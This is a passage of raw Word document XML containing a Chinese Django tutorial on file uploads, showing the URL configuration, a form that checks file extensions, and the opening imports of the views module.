        <w:t>本项目一共包括5个urls, 分别对应普通表单上传，ModelForm上传和Ajax上传。还有两个urls，一个用来显示文件清单，一个专门处理ajax请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3C3157"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#file_upload/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110A8872" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from django.urls import re_path, path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F5431F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5590F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26C94A25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># namespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7057B380" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app_name = "file_upload"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE62C36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DA07F98" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA8336C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D789F4E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Upload File Without Using Model Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66ABEA62" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^upload1/$', views.file_upload, name='file_upload'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3C112B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5610C58B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Upload Files Using Model Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ED7F15" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^upload2/$', views.model_form_upload, name='model_form_upload'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031ACF37" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="396AEDA9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Upload Files Using Ajax Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7812FD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^upload3/$', views.ajax_form_upload, name='ajax_form_upload'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A82DB58" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="659D09C1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Handling Ajax requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C75D9D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^ajax_upload/$', views.ajax_upload, name='ajax_upload'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B972CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49435430" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # View File List</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52106665" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('', views.file_list, name='file_list'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416E833B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CC87BFC" w14:textId="5057C99E" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1249486B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用一般表单上传文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206BEA7E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们先定义一个一般表单FileUploadForm，并通过clean方法对用户上传的文件进行验证，如果上传的文件名不以jpg, pdf或xlsx结尾，将显示表单验证错误信息。关于表单的自定义和验证更多内容见</w:t>
      </w:r>
      <w:hyperlink r:id="rId274" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(5): 表单forms的设计与使用</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670FB166"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#file_upload/forms.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EABEC3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC2A601" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9972B1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A4546CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Regular form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BEC61F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class FileUploadForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D497DA4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    file = forms.FileField(widget=forms.ClearableFileInput(attrs={'class': 'form-control'}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1973A1E3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    upload_method = forms.CharField(label="Upload Method", max_length=20,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0CA7D8" w14:textId="46268F64" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                    widget=forms.TextInput(attrs={'class': 'form-control'}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D0342D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_file(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28401EDF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        file = self.cleaned_data['file']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0DB054" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ext = file.name.split('.')[-1].lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B9167D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ext not in ["jpg", "pdf", "xlsx"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A37075" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise forms.ValidationError("Only jpg, pdf and xlsx files are allowed.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7559C6AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        # return cleaned data is very important.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601576C9" w14:textId="0519B44D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327AE9F7" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2F25BB" w14:textId="6518D7BF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用clean方法对表单字段进行验证时，别忘了return验证过的数据，即cleaned_data。只有返回了cleaned_data, 视图中才可以使用form.cleaned_data.get('xxx')获取验证过的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC73199" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对应一般文件上传的视图file_upload方法如下所示。当用户的请求方法为POST时，我们通过form.cleaned_data.get('file')获取通过验证的文件，并调用自定义的handle_uploaded_file方法来对文件进行重命名，写入文件。如果用户的请求方法不为POST，则渲染一个空的FileUploadForm在upload_form.html里。我们还定义了一个file_list方法来显示文件清单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C6C367"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#file_upload/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFEF108" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render, redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0344A9B3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30079A4A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import FileUploadForm, FileUploadModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C9570F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB1A28B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EC4E93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import JsonResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3499F88D" w14:textId="5B8DAC53" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
